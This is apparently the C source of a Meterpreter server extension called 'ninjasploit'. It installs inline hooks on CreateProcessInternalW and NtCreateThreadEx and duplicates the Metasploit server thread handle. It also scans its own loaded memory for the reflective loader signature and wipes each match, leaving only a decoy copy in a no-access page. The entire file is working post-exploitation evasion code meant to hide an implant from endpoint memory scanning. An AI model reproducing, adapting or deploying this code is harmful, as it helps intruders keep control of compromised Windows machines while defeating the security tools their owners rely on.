/*!
 * @file bare.c
 * @brief Entry point and intialisation functionality for the bare extention.
 */
#include "../../common/common.h"

#include "definitions.h"
#include "ninjasploit.h"
#include "../../DelayLoadMetSrv/DelayLoadMetSrv.h"
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
#include "customhooks.h"
#include "memory.h"

EnableDelayLoadMetSrv();

DWORD install_hooks(Remote *remote, Packet *packet);
DWORD restore_hooks(Remote *remote, Packet *packet);
BOOL verifyNullMem(LPVOID addr, SIZE_T size);

DWORD ninjasploit_install_hooks(Remote *remote, Packet *packet) {
	Packet *response = packet_create_response(packet);

	CreateProcessInternalW = (PCreateProcessInternalW)GetProcAddress(GetModuleHandle("KERNELBASE.dll"), "CreateProcessInternalW");
	NtCreateThreadEx = (PNtCreateThreadEx)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");

	allocatedAddresses = getAllocatedAddresses(PAGE_EXECUTE_READWRITE);

	DuplicateHandle(GetCurrentProcess(), remote->server_thread, GetCurrentProcess(), &metasploitThread, NULL, FALSE, DUPLICATE_SAME_ACCESS);

	// install hooks
	createProcessHookResult = installHook(CreateProcessInternalW, hookCreateProcessInternalW, 5);
	createRemoteThreadHookResult = installHook(NtCreateThreadEx, hookCreateRemoteThreadEx, 5);

	SIGNATURE sig;
	sig.signature = "\x5F\x52\x65\x66\x6C\x65\x63\x74\x69\x76\x65\x4C\x6F\x61\x64\x65\x72\x40\x30\x00";
	sig.sigSize = 20;

	detectableSignature = VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	for (SIZE_T i = 0; i < sig.sigSize; i++) {
		detectableSignature[i] = sig.signature[i];
	}

	DWORD dummy;

	VirtualProtect(detectableSignature, 0x1000, PAGE_NOACCESS, &dummy);

	MEMORY_BASIC_INFORMATION info = { 0 };

	VirtualQuery((LPVOID)ninjasploit_install_hooks, &info, sizeof(MEMORY_BASIC_INFORMATION));

	PATTERN_RESULT signatures = { 0 }; 
	signatures.sigs = malloc(sizeof(SIZE_T) * 10);

	patternScanEx((SIZE_T)info.AllocationBase, info.RegionSize, "xxxxxxxxxxxxxxxxxxxx", &sig, &signatures, 10);

	for (SIZE_T i = 0; i < signatures.size; i++) {
		DWORD protect, dummy;

		VirtualQuery((LPVOID)signatures.sigs[i], &info, sizeof(MEMORY_BASIC_INFORMATION));

		if (info.Protect != PAGE_NOACCESS) {
			VirtualProtect((LPVOID)signatures.sigs[i], sig.sigSize, PAGE_READWRITE, &protect);

			SecureZeroMemory((LPVOID)signatures.sigs[i], sig.sigSize);
			VirtualProtect((LPVOID)signatures.sigs[i], sig.sigSize, protect, &dummy);
		}
	}

	free(signatures.sigs);

	packet_add_tlv_string(response, TLV_TYPE_NINJASPLOIT_INSTALL_HOOKS, "Hooks installed!");
	packet_transmit_response(ERROR_SUCCESS, remote, response);

	return ERROR_SUCCESS;
}


DWORD ninjasploit_restore_hooks(Remote *remote, Packet *packet) {
	Packet *response = packet_create_response(packet);

	BOOL restored = FALSE;

	if (createProcessHookResult != NULL) {
		restoreHook(createProcessHookResult);
		restored = TRUE;
	}

	if (createRemoteThreadHookResult != NULL) {
		restoreHook(createRemoteThreadHookResult);
		restored = TRUE;
	}

	PCHAR msg = restored ? "Restored all hooks" : "There was no hooks to restore";

	packet_add_tlv_string(response, TLV_TYPE_NINJASPLOIT_RESTORE_HOOKS, msg);

	packet_transmit_response(ERROR_SUCCESS, remote, response);

	return ERROR_SUCCESS;
}


Command customCommands[] =
{
	COMMAND_REQ("ninjasploit_install_hooks", ninjasploit_install_hooks),
	COMMAND_REQ("ninjasploit_restore_hooks", ninjasploit_restore_hooks),
	COMMAND_TERMINATOR
};

/*!
 * @brief Initialize the server extension
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	hMetSrv = remote->met_srv;

	command_register_all(customCommands);

	createProcessHookResult = NULL;
	createRemoteThreadHookResult = NULL;


	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	command_deregister_all(customCommands);

	return ERROR_SUCCESS;
}

